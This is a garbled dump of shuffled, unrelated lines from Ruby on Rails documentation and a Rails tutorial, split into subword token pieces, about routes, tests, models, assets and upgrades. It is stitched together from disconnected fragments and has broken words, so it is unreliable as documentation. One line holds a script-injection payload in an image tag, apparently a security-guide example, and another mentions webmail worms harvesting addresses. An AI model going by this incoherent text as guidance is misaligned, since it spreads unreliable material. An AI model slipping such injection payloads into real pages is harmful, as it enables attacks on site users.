▁You ▁can ▁use ▁multiple ▁lines ▁if ▁you ▁need ▁more ▁ space ▁and ▁you ▁can ▁a tt a ch ▁code ▁examples ▁ indent ed ▁with ▁4 ▁spaces ▖
▁| ▁GET ▁| ▁ / photos / : id ▁| ▁photos # show ▁| ▁image _ path (: id ) ▁|
▁In ▁this ▁case , ▁it ' s ▁easy ▁to ▁write ▁a ▁short ▁test ▁for ▁the ▁User ▁model , ▁in ▁which ▁we ▁use ▁\ k ode { following ?}
▁This ▁cache ▁is ▁not ▁thread ▁ safe ▁and ▁is ▁intend ed ▁only ▁for ▁ serv ing ▁as ▁a ▁temporary ▁memory ▁cache ▁for ▁a ▁single ▁thread .
▁errors ▖ add (: discount , ▁" can ' t ▁be ▁ greater ▁than ▁total ▁value ")
▁</ html >
▁The ▁purpose ▁of ▁this ▁section ▁is ▁to ╼ desc ri be ▁general ▁ caching ▁behavior ▁of ▁most ▁CDN s , ▁your ▁specific ▁provide r ▁may ╼ be have ▁slightly ▁different ly .
▁Extensions ▁to ▁` Class `
▁To ▁\ emph { print } ▁a ▁string , ▁the ▁most ▁common ly ▁used ▁Ruby ▁function ▁is ▁\ k ode { puts } ▁( pronoun c ed ▁`` put ▁ ess '' , ▁for ▁`` put ▁string '') :
▁Also ▁you ▁can ▁use ▁them ▁in ▁any ▁place ▁that ▁you ▁want ▁inside ▁the ▁routes , ▁for ▁example ▁in ▁a ▁scope ▁or ▁ namespace ▁call :
▁Configuration ▁ Go t cha s
▁The ▁full ▁set ▁of ▁methods ▁that ▁can ▁be ▁used ▁in ▁this ▁block ▁are ▁as ▁follows :
▁as ▁show n ▁in ▁Listing ~\ ref { code : bootstrap _ js } .
▁< ul >< li >`: location ` ▁- ▁The ▁location ▁of ▁the ▁ sendmail ▁execut able ▖
▁TIP : ▁In ▁development ▁mode ▁( which ▁is ▁what ▁you ' re ▁working ▁in ▁by ▁default ), ▁Rails ╼ reload s ▁your ▁application ▁with ▁every ▁browser ▁request , ▁so ▁there ' s ▁no ▁need ▁to ▁stop ╼ and ▁restart ▁the ▁web ▁server ▁when ▁a ▁change ▁is ▁made .
▁You ▁can ▁\ href { http :// l m gt fy ▖ com / ? q = invalid + multi by te + character } { Google ▁the ▁error ▁message } ▁if ▁you ▁want ▁to ▁learn ▁how ▁to ▁make ▁it ▁go ▁a way .
▁The ▁\ k ode { update \_ attributes } ▁method ▁is ▁an ▁alias ▁for ▁the ▁short er ▁\ k ode { update } ▁method , ▁but ▁I ▁prefer ▁the ▁longer ▁version ▁because ▁of ▁its ▁similar ity ▁to ▁the ▁ singular ▁version ▁of ▁the ▁method , ▁\ k ode { update \_ attribute } .
▁< img ▁src = javascript : alert (' Hello ') >
▁( In ▁fact , ▁as ▁we ▁saw ▁in ▁Section ~\ ref { sec : demo _ users _ resource } ▁and ▁Section ~\ ref { sec : microposts _ resource }, ▁\ text tt { rails ▁generate } ▁can ▁make ▁automatic ▁edit s ▁to ▁the ▁\ text tt { routes ▖ rb } ▁file , ▁which ▁we ▁also ▁want ▁to ▁undo ▁automatically ▖)
▁ Each ▁action ' s ▁purpose ▁is ▁to ▁collect ▁information ▁to ▁provide ╼ it ▁to ▁a ▁view .
▁* ▁` active _ support ▖ initialize _ time _ zone ` ▁Set s ▁the ▁default ▁time ▁ zone ▁for ▁the ▁application ▁base d ▁on ▁the ▁` config ▖ time _ zone ` ▁setting , ▁which ▁defaults ▁to ▁" UT C " .
▁As ▁in ▁Section ~\ ref { sec : requiring _ signed _ in _ users } ▁and ▁Section ~\ ref { sec : requiring _ the _ right _ user }, ▁we ' ll ▁enforce ▁access ▁control ▁using ▁a ▁before ▁filter , ▁this ▁time ▁to ▁restrict ▁access ▁to ▁the ▁\ k ode { destroy } ▁action ▁to ▁admin s .
▁exist ▁app / views / users
▁ Turbolinks
▁( You ▁m ight ▁have ▁to ▁follow ▁the ▁\ href { http :// help ▖ github ▖ com / key - setup - redirect } { GitHub ▁tutorial ▁on ▁creating ▁ SSH ▁keys } ▁first ▖)
▁A ▁mockup ▁of ▁the ▁user ▁following ▁page .
▁But ▁what ▁can ▁go ▁wrong ?
▁class ▁Re present a tive ▁< ▁ActiveRecord :: Base
▁**` ActionDispatch :: Flash ` **
▁If ▁you ▁have ▁a ▁question ▁on ▁how ▁the ▁Rails ▁team ▁handle s ▁certain ▁API , ▁don ' t ▁he s it ate ▁to ▁open ▁a ▁t i cket ▁or ▁send ▁a ▁ patch ▁to ▁the ▁[ issue ▁ track er ]( https :// github ▖ com / rails / rails / issue s ) .
▁A ▁ stub ▁view ▁for ▁ showing ▁user ▁information .
▁ ╼ * = ▁require _ tree ▁ .
▁The ▁best ▁way ▁to ▁be ▁sure ▁that ▁your ▁application ▁ still ▁works ▁after ▁upgrading ▁is ▁to ▁have ▁good ▁test ▁cover age ▁before ▁you ▁start ▁the ▁process ▖
▁If ▁you ▁prefer ▁to ▁learn ▁everything ▁system at ical ly ▁from ▁the ▁ gr ound ▁up , ▁or ▁if ▁you ▁have ▁ never ▁program m ed ▁before , ▁then ▁learning ▁Ruby ▁first ▁m ight ▁work ▁well ▁for ▁you , ▁and ▁in ▁this ▁case ▁I ▁recommend ▁\ href { http :// www ▖ a mazon ▖ com / gp / product / 14 3022 36 34 }{\ emph { B eginning ▁Ruby } } ▁by ▁P eter ▁Cooper .
▁@ open _ order ▁= ▁@ open _ orders ▖ first ▁# ▁Now ▁the ▁database ▁will ▁be ▁ q ue ri ed
▁User ▖ all ▖ each ▁do ▁| user |
▁The ▁full ▁application ▁code ▁appears ▁in ▁Listing ~\ ref { code : settings _ link }) .
▁#### ▁ Getting ▁a ▁D if f er ent ▁Re d ir ec t ▁S t at us ▁Code
▁As ▁with ▁account ▁ activations ▁( Section ~\ ref { sec : account _ activations _ resource }), ▁our ▁first ▁step ▁is ▁to ▁generate ▁a ▁controller ▁for ▁our ▁new ▁resource :
▁get ▁' / patients / : id ', ▁to : ▁' patients # show ', ▁as : ▁' patient '
▁ 12345 67 ▖ to _ s (: human ) ▁# ▁=> ▁" 1▖23 ▁M illion "
▁# ▁Be ▁sure ▁to ▁restart ▁your ▁server ▁when ▁you ▁modify ▁this ▁file .
▁We ▁see ▁here ▁that ▁\ k ode { pluralize } ▁take s ▁an ▁ integer ▁argument ▁and ▁then ▁returns ▁the ▁number ▁with ▁a ▁properly ▁ pluralize d ▁version ▁of ▁its ▁second ▁argument .
▁As ▁you ▁saw ▁above :
▁There ▁are ▁also ▁two ▁common ▁ways ▁to ▁specify ▁a ▁gem ▁version ▁ range , ▁which ▁allows ▁us ▁to ▁ ex er t ▁some ▁control ▁over ▁the ▁version ▁used ▁by ▁Rails .
▁The ▁user ▁profile ▁with ▁microposts ▁(\ href { http :// localhost :3000/ users /1}{/ users /1 }) .
▁to ▁check ▁the ▁right ▁redirect ▁ target ▁and
▁When ▁you ▁include ▁the ▁engine ▁into ▁an ▁application ▁later ▁on , ▁you ▁will ▁do ▁so ▁with ╼ this ▁line ▁in ▁the ▁Rails ▁application ' s ▁` Gemfile `:
▁ ╼ ▁following
▁A ▁test ▁for ▁the ▁links ▁on ▁the ▁layout ▖
▁#### ▁` c attr _ reader `, ▁` c attr _ writer `, ▁and ▁` c attr _ accessor `
▁\ href { http :// p eep code ▖ com /}{ PeepCode } : ▁E x ce ll ent ▁ com m er cial ▁ screencasts
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : initial _ working _ feed }
▁| ▁GET ▁| ▁ / photos / : id / edit ▁| ▁photos # edit ▁| ▁edit _ image _ path (: id ) ▁|
▁But ▁this ▁will ▁ _ not _ ▁stop ▁the ▁rest ▁of ▁the ▁code ▁in ▁the ▁` show ` ▁action ▁from ▁running , ▁and ▁when ▁Rails ▁hit s ▁the ▁end ▁of ▁the ▁action , ▁it ▁will ▁start ▁to ▁render ▁the ▁` regular _ show ` ▁view ▁- ▁and ▁throw ▁an ▁error ▖
▁### ▁Using ▁a ▁ Symbol ▁with ▁`: if ` ▁and ▁`: unless `
▁from ▁Listing ~\ ref { code : user _ logout _ test } ▁to
▁To ▁execute ▁the ▁code ▁in ▁Listing ~\ ref { code : sample _ relationships }, ▁we ▁re seed ▁the ▁database ▁as ▁usual :
▁Sprockets ▁will ▁also ▁look ▁through ▁the ▁paths ▁specified ▁in ▁` config ▖ assets ▖ paths ` ,╼ which ▁includes ▁the ▁standard ▁application ▁paths ▁and ▁any ▁paths ▁added ▁by ▁Rails ╼ engine s .
▁is ▁automatically ▁convert ed ▁to
▁ ╼ ▁=> ▁2
▁* ▁` group `
▁A ▁mockup ▁of ▁the ▁signin ▁form ▖ ~\ href { http :// railstutorial ▖ org / images / figures / signin _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁ Adding ▁ Factory ▁Girl ▁to ▁the ▁\ k ode { Gemfile } .
▁This ▁requires ▁the ▁use ▁of ▁the ▁\ k ode { paginate } ▁method , ▁which ▁we ' ll ▁cover ▁short ly .
▁As ▁long ▁as ▁the ▁version ▁number ▁is ▁1▖ 11 ▖ x ▁or ▁ greater , ▁installed ▁gems ▁will ▁automatically ▁be ▁executed ▁in ▁the ▁proper ▁Bundler ▁environment , ▁so ▁that ▁you ▁can ▁write ▁( for ▁example )
▁We ▁can ▁eliminate ▁this ▁duplication ▁with ▁a ▁\ k ode { before } ▁block :
▁U p on ▁ en counter ing ▁an ▁error ▁or ▁failing ▁test , ▁the ▁test ▁run n er ▁shows ▁a ▁`` stack ▁t ra ce '' ▁or ▁`` backtrace '' ▁that ▁ tr ac es ▁the ▁course ▁of ▁a ▁failed ▁test ▁through ▁the ▁application .
▁Active ▁Record ▁Basic s
▁$ ▁bundle ▁exec ▁rake ▁test ▁TEST = test / helpers / sessions _ helper _ test ▖ rb
▁#< Client ▁id : ▁2 19 , ▁first _ name : ▁" J a me s "> ,
▁We ' ll ▁start ▁by ▁adding ▁the ▁required ▁\ k ode { remember \_ digest } ▁attribute ▁to ▁the ▁User ▁model , ▁as ▁show n ▁in ▁Figure ~\ ref { fig : user _ model _ remember _ digest } .
▁in ▁Listing ~\ ref { code : generated _ user _ fixtures } .
▁With ▁invalid ▁information , ▁the ▁update ▁attempt ▁returns ▁\ k ode { false }, ▁so ▁the ▁\ k ode { else } ▁branch ▁render s ▁the ▁edit ▁page .
▁B oth ▁web mail ▁worm s ▁have ▁the ▁goal ▁to ▁ha r ve st ▁email ▁addresses , ▁something ▁a ▁c r im in al ▁ha c k er ▁could ▁make ▁m one y ▁with .
▁By ▁wrap p ing ▁the ▁\ k ode { post } ▁in ▁the ▁\ k ode { assert \_ no \_ difference } ▁method ▁with ▁the ▁string ▁argument ▁\ k ode { ' User ▖ count ' }, ▁we ▁arrange ▁for ▁a ▁compar is on ▁between ▁\ k ode { User ▖ count } ▁before ▁and ▁after ▁the ▁contents ▁of ▁the ▁\ k ode { assert \_ no \_ difference } ▁block .
▁<%= ▁link _ to ▁" an ▁article ", ▁@ article , ▁remote : ▁true ▁%>
▁You ▁should ▁get ▁an ▁error ▁that ▁look s ▁like ▁this :
▁Scopes
▁If ▁we ▁wish ▁to ▁remove ▁ s co p ing ▁for ▁any ▁reason ▁we ▁can ▁use ▁the ▁` unscope d ` ▁method ▖
▁< strong > Comment : </ strong >
▁What ' s ▁Next ?
▁Job ▁E x e cut ion
▁The ▁point ▁of ▁the ▁\ k ode { home } ▁action , ▁as ▁we ▁saw ▁in ▁Chapter ~\ ref { cha : static _ pages }, ▁is ▁to ▁render ▁a ▁web ▁page , ▁not ▁to ▁return ▁a ▁value .
▁The ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁is ▁a ▁book ▁on ▁web ▁development , ▁not ▁web ▁design , ▁but ▁it ▁would ▁be ▁ de press ing ▁to ▁work ▁on ▁an ▁application ▁that ▁look s ▁like ▁\ emph { com p let e } ▁c rap , ▁so ▁in ▁this ▁section ▁we ' ll ▁add ▁some ▁structure ▁to ▁the ▁layout ▁and ▁give ▁it ▁some ▁minimal ▁styling ▁with ▁CSS ▖ ▁In ▁addition ▁to ▁using ▁some ▁custom ▁CSS ▁rules , ▁we ' ll ▁make ▁use ▁of ▁\ href { http :// get bootstrap ▖ com /}{ \ emph { Bootstrap } }, ▁an ▁open - source ▁web ▁design ▁framework ▁from ▁Twitter .
▁create ▁app / controllers / users _ controller ▖ rb
▁ alert ▁" The ▁article ▁was ▁delete d ▖ "
▁( Figure ~\ ref { fig : user _ model _ sketch } ▁is ▁just ▁a ▁ sketch ; ▁the ▁full ▁data ▁model ▁appears ▁in ▁Figure ~\ ref { fig : user _ model _ initial } ▖)
▁( Writ ing ▁a ▁test ▁for ▁email ▁downcas ing ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ uniqueness _ validation })▖)
▁### ▁form _ for
▁1234567890 12345 6 ▖ to _ s (: human ) ▁# ▁=> ▁" 1▖23 ▁ Q u ad r illion "
▁### ▁Time ▁C on str u c to rs
▁For ▁the ▁ resizing ▁command , ▁there ▁are ▁sever al ▁possibilities ▁list ed ▁in ▁the ▁\ href { http :// www ▖ rdoc ▖ info / github / j nick la s / carrierwave / CarrierWave / MiniMagick } { MiniMagick ▁documentation }, ▁but ▁the ▁one ▁we ▁want ▁is ▁\ k ode { re size \_ to \_ limit : ▁[ 400 , ▁ 400 ]} , ▁which ▁re size s ▁large ▁images ▁so ▁that ▁they ▁are n ' t ▁any ▁big g er ▁than ▁ 400 p x ▁in ▁either ▁di m en s ion , ▁while ▁simul t an e ous ly ▁leav ing ▁small er ▁images ▁ al one .
▁We ▁can ▁convenient ly ▁test ▁the ▁data ▁model ▁above ▁using ▁the ▁\ k ode { followers ▖ include ?}\ ▁method , ▁as ▁show n ▁in ▁Listing ~\ ref { code : followers _ test } .
▁In ▁all ▁of ▁these ▁methods , ▁` association ` ▁is ▁replace d ▁with ▁the ▁symbol ▁passed ▁as ▁the ▁first ▁argument ▁to ▁` has _ one ` ▖
▁end
▁The ▁following ▁ sequence ▁occur s : ▁request ▁1 ▁creates ▁a ▁user ▁in ▁memory ▁that ▁passes ▁validation , ▁request ▁2 ▁does ▁the ▁same , ▁request ~ 1 ' s ▁user ▁get s ▁saved , ▁request ~ 2 ' s ▁user ▁get s ▁saved .
▁It ▁failed .
▁ / home / ubuntu / workspace / sample _ app /
▁* ▁P ref er ▁class ▁<< ▁self ▁over ▁self ▖ method ▁for ▁class ▁methods .
▁( The ▁ alert ▁reader ▁m ight ▁notice ▁at ▁this ▁point ▁that ▁the ▁second ▁\ k ode { return } ▁here ▁is ▁actually ▁unnecessary --- be ing ▁the ▁last ▁expression ▁in ▁the ▁function , ▁the ▁string ▁\ k ode {" The ▁string ▁is ▁nonempty ▖ "} ▁will ▁be ▁returned ▁regardless ▁of ▁the ▁\ k ode { return } ▁keyword , ▁but ▁using ▁\ k ode { return } ▁in ▁both ▁place s ▁has ▁a ▁p le as ing ▁ sy m me try ▁to ▁it ▖)
▁* = ▁require _ tree ▁ .
▁<%= ▁text _ field ▁: person , ▁: email _ confirmation ▁%>
▁P ra c tic ally ▁all ▁the ▁software ╼ in ▁the ▁world ▁is ▁either ▁broken ▁or ▁very ▁difficult ▁to ▁use .
▁S ince ▁we ▁will ▁be ▁including ▁the ▁ stats ▁on ▁both ▁the ▁user ▁show ▁pages ▁and ▁the ▁ home ▁page , ▁the ▁first ▁line ▁of ▁Listing ~\ ref { code : stats _ partial } ▁ pick s ▁the ▁right ▁one ▁using
▁config ▖ action _ view ▖ sanitize d _ allow ed _ tags ▁= ▁' table ', ▁' tr ', ▁' td '
▁$ ▁git ▁ checkout ▁- b ▁my _ new _ branch
▁This ▁final ▁chapter ▁contains ▁some ▁of ▁the ▁most ▁challenging ▁material ▁in ▁the ▁tutorial , ▁including ▁some ▁Ruby / SQL ▁trick er y ▁to ▁make ▁the ▁status ▁feed .
▁By ▁the ▁way , ▁it ' s ▁worth ▁noting ▁that , ▁a lthough ▁we ▁have n ' t ▁actually ▁test ed ▁for ▁the ▁presence ▁of ▁the ▁links ▁on ▁the ▁layout , ▁our ▁tests ▁will ▁fail ▁if ▁the ▁routes ▁are n ' t ▁defined .
▁Here ▁are ▁two ▁examples ▁that ▁c la sh ▁with ▁routes ▁named ▁` example _ path `:
▁The ▁result ing ▁layout ▁appears ▁in ▁Listing ~\ ref { code : application _ layout } .
▁# ▁=> ▁100 %
▁WARNING : ▁There ▁is ▁ s el dom ▁any ▁good ▁reason ▁to ▁use ▁this ▁option ▖
▁| ▁ Response ▁ Class ▁| ▁HTTP ▁S t at us ▁Code ▁| ▁ Symbol ▁|
▁For ▁example
▁This ▁change ▁applies ▁to ▁most ▁place s ▁in ▁Rails ▁where ▁callbacks ▁are ▁used , ▁including ╼ Active ▁Record ▁and ▁Active ▁Model ▁callbacks , ▁as ▁well ▁as ▁filter s ▁in ▁Action ╼ Controller ▁( e ▖ g ▖ ▁` before _ action ` ) .
▁### ▁Generat ing ▁a ▁Controller
▁# ▁Un comment ▁these ▁lines ▁on ▁Windows .
▁In ▁this ▁context , ▁it ' s ▁helpful ▁to ▁have ▁a ▁set ▁of ▁ guidelines ▁on ▁when ▁we ▁should ▁test ▁first ▁( or ▁test ▁at ▁all ) .
▁We ▁accomplish ▁this ▁with ▁the ▁\ k ode { hidden \_ field \_ tag } ▁method ▁in ▁Listing ~\ ref { code : follow _ form }, ▁which ▁produce s ▁HTML ▁of ▁the ▁form
▁app / assets / stylesheets / custom ▖ css ▖ scss
▁The ▁code ▁for ▁the ▁ modified ▁user ▁show ▁page ▁appears ▁in ▁Listing ~\ ref { code : user _ show _ with _ sidebar } .
▁Similar ly , ▁if ▁a ▁` before _ remove ` ▁callback ▁throw s ▁an ▁exception , ▁the ▁object ▁does ▁not ▁get ▁removed ▁from ▁the ▁collection .
▁An ▁` ArgumentError ` ▁exception ▁will ▁be ▁raised ▁if ▁the ▁argument ▁passed ▁does ▁not ▁respond ▁to ▁` include ?` .
▁# ▁D is able ▁root ▁element ▁in ▁JSON ▁by ▁default .
▁Active ▁Support ▁add s ▁to ▁` Time ` ▁many ▁of ▁the ▁methods ▁available ▁for ▁` DateTime `:
▁Note ▁the ▁notation ▁\ k ode { class ▁ UsersController ▁< ▁Application Controller }, ▁which ▁is ▁an ▁example ▁of ▁a ▁Ruby ▁\ emph { class } ▁with ▁\ emph { inheritance } .
▁#### ▁S w app ing ▁a ▁ Middleware
▁You ▁need ▁to ▁change ▁your ▁session ▁key ▁to ▁something ▁new , ▁or ▁remove ▁all ▁sessions :
▁* ▁` update _ all `
▁With in ▁a ▁layout , ▁you ▁have ▁access ▁to ▁three ▁tool s ▁for ▁ com bin ing ▁different ▁bit s ▁of ▁output ▁to ▁form ▁the ▁over all ▁response :
▁For ▁complex ▁class ╼ mod if ic ation s , ▁consider ▁using ▁` ActiveSupport :: Concern ` .
▁create ▁app / controllers / microposts _ controller ▖ rb
▁ Adding ▁the ▁ follower ▁\ k ode { belongs \_ to } ▁association ▁to ▁the ▁Relationship ▁model .
▁in ▁Listing ~\ ref { code : log _ out _ with _ forget } .
▁In ▁addition ▁to ▁the ▁routes ▁for ▁ magazine s , ▁this ▁declaration ▁will ▁also ▁route ▁ ads ▁to ▁an ▁` A d sController ` ▖
▁validates _ each ▁: name , ▁: surname ▁do ▁| record , ▁ attr , ▁value |
▁So , ▁if ▁you ' re ▁using ▁only ▁the ▁standard ▁RESTful ▁routes , ▁no ▁changes ▁need ▁to ▁be ▁made :
▁As ▁with ▁sessions ▁( Section ~\ ref { sec : sessions _ and _ failed _ login }), ▁we ' ll ▁model ▁account ▁ activations ▁as ▁a ▁resource ▁even ▁though ▁they ▁won ' t ▁be ▁ associated ▁with ▁an ▁Active ▁Record ▁model .
▁To ▁upgrade , ▁simply ▁add ▁` gem ▁' d all i ' ` ▁to ▁your ▁` Gemfile ` .
▁S ince ▁the ▁connection ▁ po ol ing ▁is ▁handle d ▁inside ▁of ▁Active ▁Record ▁by ▁default , ▁all ▁application ▁server s ▁( Thin , ▁ mong rel , ▁Un ic or n ▁etc ▖) ▁should ▁be have ▁the ▁same ▖
▁ Adding ▁\ k ode { has \_ secure \_ password } ▁to ▁the ▁User ▁model ▖
▁A nother ▁common ▁question ▁is ▁whether ▁to ▁use ▁tests ▁from ▁the ▁start .
▁In ▁the ▁present ▁context , ▁a ▁\ emph { hash } ▁refer s ▁not ▁to ▁the ▁Ruby ▁data ▁structure ▁from ▁Section ~\ ref { sec : hashes _ and _ symbols } ▁but ▁rather ▁to ▁the ▁result ▁of ▁apply ing ▁an ▁ ir reversible ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Hash _ function } { hash ▁function } ▁to ▁input ▁data ▖)
▁Database ▁files
▁Use ▁your ▁existing ▁` secret _ key _ base ` ▁from ▁the ▁` secret _ token ▖ rb ` ▁initializer ▁to ╼ ▁set ▁the ▁ SE C RE T _ KEY _ BASE ▁environment ▁variable ▁for ▁which ever ▁users ▁running ▁the ╼ ▁Rails ▁application ▁in ▁production ▁mode ▖
▁Recall ▁from ▁Listing ~\ ref { code : signup _ form } ▁that ▁the ▁signup ▁form ▁uses ▁the ▁\ k ode { form \_ for } ▁helper , ▁tak ing ▁as ▁an ▁argument ▁the ▁user ▁instance ▁variable ▁\ k ode {@ user } :
▁in ▁Listing ~\ ref { code : microposts _ controller _ access _ control } .
▁var ▁= ▁bar
▁| ▁** S u cc ess ** ▁| ▁200 ▁| ▁: o k ▁|
▁ Base d ▁on ▁the ▁fixtures ▁in ▁Listing ~\ ref { code : users _ fixtures _ extra _ users } ▁and ▁Listing ~\ ref { code : add _ micropost _ different _ owner }, ▁this ▁means ▁that ▁ Michael ▁should ▁see ▁L an a ' s ▁posts ▁and ▁his ▁own ▁posts , ▁but ▁not ▁A r ch er ' s ▁posts .
▁#### ▁ Mo t i v ation
▁ Digest :: S HA 2▖ hexdigest ( File ▖ read ( Rails ▖ root ▖ join (' test / fixtures ', ▁path ) ) )
▁It s ▁one ▁argument ▁is ▁the ▁right - h and ▁ side ▁of ▁the ▁assignment , ▁in ▁this ▁case ▁the ▁user ▁to ▁be ▁signed ▁in .
▁On ▁the ▁other ▁hand , ▁we ▁have ▁yet ▁to ▁respond ▁properly ▁when ▁JavaScript ▁is ▁enabled .
▁< ▁ Edit ▁the ▁commit ▁message ▁to ▁make ▁sense , ▁and ▁describe ▁all ▁your ▁changes ▖ ▁>
▁OR DER ▁BY ▁clients ▖ created _ at ▁ desc ")
▁When ▁the ▁desired ▁behavior ▁isn ' t ▁yet ▁c ry st al ▁clear , ▁ le an ▁toward ▁writing ▁the ▁application ▁code ▁first , ▁then ▁write ▁a ▁test ▁to ▁co d if y ▁the ▁result .
▁In ▁addition , ▁since ▁each ▁ row ▁is ▁a ▁user , ▁we ▁would ▁need ▁to ▁include ▁the ▁user ' s ▁other ▁attributes , ▁including ▁the ▁name , ▁password , ▁etc .
▁As ▁a ▁result , ▁when ▁we ▁deploy ▁the ▁application ▁in ▁Section ~\ ref { sec : production _ webserver }, ▁SSL ▁will ▁automatically ▁be ▁enabled .
▁When ▁d ec id ing ▁when ▁and ▁how ▁to ▁test , ▁it ' s ▁helpful ▁to ▁understand ▁\ emph { w h y } ▁to ▁test ▖ ▁In ▁my ▁view , ▁writing ▁automate d ▁tests ▁has ▁three ▁main ▁benefit s :
▁create ▁app / assets / javascripts / static _ pages ▖ js ▖ coffee
▁We ▁then ▁implement ▁code ▁to ▁get ▁the ▁test ▁to ▁pass , ▁represent ed ▁by ▁the ▁ color ▁green .
▁If ▁you ▁need ▁to ▁keep ▁old ▁behavior ▁with ▁no ▁mil li second ╼ precision , ▁set ▁the ▁following ▁in ▁an ▁initializer :
▁Active ▁Record ▁let s ▁you ▁ eager ▁load ▁any ▁number ▁of ▁associations ▁with ▁a ▁single ▁` Model ▖ find ` ▁call ▁by ▁using ▁an ▁array , ▁hash , ▁or ▁a ▁nested ▁hash ▁of ▁array / hash ▁with ▁the ▁` includes ` ▁method .
▁Because ▁cookies ▁persist ▁from ▁one ▁page ▁to ▁the ▁next , ▁they ▁can ▁store ▁information ▁( such ▁as ▁a ▁user ▁id ) ▁that ▁can ▁be ▁used ▁by ▁the ▁application ▁to ▁retrieve ▁the ▁logged - in ▁user ▁from ▁the ▁database .
▁[ rails ▖ js ]( https :// github ▖ com / rails / jquery - ujs / blo b / master / s r c / rails ▖ js )╼ provide s ▁the ▁JavaScript ▁h al f , ▁and ▁the ▁regular ▁Ruby ▁view ▁helpers ▁add ▁appropriate ╼ tags ▁to ▁your ▁ DOM ▖
▁Validat ing ▁the ▁uniqueness ▁of ▁email ▁addresses , ▁ignoring ▁case ▖
▁You ▁can ▁invoke ▁` test _ j db c mysql `, ▁` test _ j db c sqlite 3 ` ▁or ▁` test _ j db c postgresql ` ▁also ▖
▁A ▁slightly ▁more ▁advanced ▁t w ist ▁on ▁associations ▁is ▁the ▁ _ polymorphic ▁association _ ▖
▁ Previous ly , ▁they ▁were ▁g at her ed ▁and ▁then ▁sort ed ▁ al ph a be tic ally ▖
▁After ▁ installing ▁Git , ▁you ▁should ▁perform ▁a ▁set ▁of ▁one - time ▁setup ▁steps .
▁The ▁results ▁appear ▁in ▁Listing ~\ ref { code : create _ password _ reset } .
▁( We ▁place ▁the ▁\ k ode { annotate } ▁gem ▁in ▁a ▁\ k ode { group ▁: development } ▁block ▁( an a log ous ▁to ▁\ k ode { group ▁: test }) ▁because ▁the ▁an not ation s ▁are n ' t ▁needed ▁in ▁production ▁applications ▖)
▁We ▁next ▁install ▁it ▁with ▁\ k ode { bundle ▁install } :
▁The ▁sample ▁users ▁in ▁production .
▁To ▁test ▁the ▁ logout ▁machinery , ▁we ▁can ▁add ▁some ▁steps ▁to ▁the ▁user ▁login ▁test ▁from ▁Listing ~\ ref { code : user _ login _ test _ valid _ information } .
▁format ▖ json ▁do
▁as ▁seen ▁in ▁Listing ~\ ref { code : password _ migration } .
▁# ▁action _ mailer / test _ case ▖ rb
▁render ▁: edit
▁The ▁result ▁of ▁Listing ~\ ref { code : typography _ css } ▁is ▁show n ▁in ▁Figure ~\ ref { fig : sample _ app _ typography } .
▁A ▁\ k ode { correct \_ user } ▁before ▁filter ▁to ▁protect ▁the ▁edit / update ▁pages ▖
▁$ ▁bundle ▁exec ▁rake ▁test ╼ 3 ▁tests , ▁6 ▁assertions , ▁3 ▁failure s , ▁0 ▁errors , ▁0 ▁skip s
▁will ▁generate ▁a ▁match ▁for ▁each ▁item .
▁A lthough ▁we ' ll ▁keep ▁individual ▁user ▁\ k ode { show } ▁pages ▁ visible ▁to ▁all ▁site ▁visit or s , ▁the ▁user ▁\ k ode { index } ▁will ▁be ▁restrict ed ▁to ▁signed - in ▁users ▁so ▁that ▁there ' s ▁a ▁ limit ▁to ▁how ▁much ▁un register ed ▁users ▁can ▁see ▁by ▁default .
▁make _ users
▁In ▁all ▁cases , ▁the ▁value ▁must ▁be ▁exactly ▁` false ` ▁and ▁not ▁any ▁false ▁value .
▁" admin _ user "▖ camelize ▁# ▁=> ▁" Admin User "
▁Configur ing ▁RSpec ▁to ▁automatically ▁use ▁Spork .
▁The ▁we ir d ▁\ k ode { [ if ▁ lt ▁ IE ▁ 9 ]} ▁syntax ▁is ▁\ emph { not } ▁part ▁of ▁Rails ; ▁it ' s ▁actually ▁a ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Conditional _ comment } { condition al ▁comment } ▁supported ▁by ▁ Internet ▁E x p l or er ▁browsers ▁for ▁just ▁this ▁sort ▁of ▁situation .
▁Fin ally , ▁our ▁class ▁defines ▁a ▁method ▁called ▁\ k ode { formatted \_ email } ▁that ▁uses ▁the ▁values ▁of ▁the ▁as signed ▁\ k ode {@ name } ▁and ▁\ k ode {@ email } ▁variables ▁to ▁build ▁up ▁a ▁nicely ▁ formatted ▁version ▁of ▁the ▁user ' s ▁email ▁address ▁using ▁string ▁inter p ol ation ▁( Section ~\ ref { sec : string s }) :
▁╼╼ ▁\ subsection { Heroku ▁setup } ╼ ▁\ label { sec : heroku _ setup }╼╼
▁You ▁would ▁place ▁these ▁controllers ▁under ▁the ▁` app / controllers / admin ` ▁directory , ▁and ▁you ▁can ▁group ▁them ▁together ▁in ▁your ▁route r :
▁Rails ▁comes ▁ equ ip ped ▁with ▁three ▁ environments : ▁\ text tt { test }, ▁\ text tt { development }, ▁and ▁\ text tt { production } .
▁The ▁SQL ▁it ▁execute s ▁look s ▁like ▁this :
▁of ▁this ▁software ▁and ▁ associated ▁documentation ▁files ▁( the ▁" Software ") , ▁to ▁deal
▁But ▁ administrative ▁users ▁should ▁see ▁such ▁links , ▁and ▁by ▁click ing ▁on ▁a ▁delete ▁link ▁we ▁expect ▁an ▁admin ▁to ▁delete ▁the ▁user , ▁i ▖ e ▖ , ▁to ▁change ▁the ▁\ k ode { User } ▁count ▁by ~\ k ode { - 1 } :
▁ /* ▁header ▁* /
▁in ▁Listing ~\ ref { code : layout _ login _ logout _ links } ▁and
▁If ▁you ▁need ▁to ▁create ▁routes ▁for ▁more ▁than ▁one ▁resource , ▁you ▁can ▁save ▁a ▁bit ▁of ▁typing ▁by ▁defin ing ▁them ▁all ▁with ▁a ▁single ▁call ▁to ▁` resources `:
▁" equipment "▖ pluralize ▁# ▁=> ▁" equipment "
▁We ' ve ▁seen ▁lot s ▁of ▁examples ▁of ▁using ▁classes ▁to ▁in st an t i ate ▁objects , ▁but ▁we ▁have ▁yet ▁to ▁do ▁so ▁explicitly .
▁<%= ▁pagination _ links ▁%>
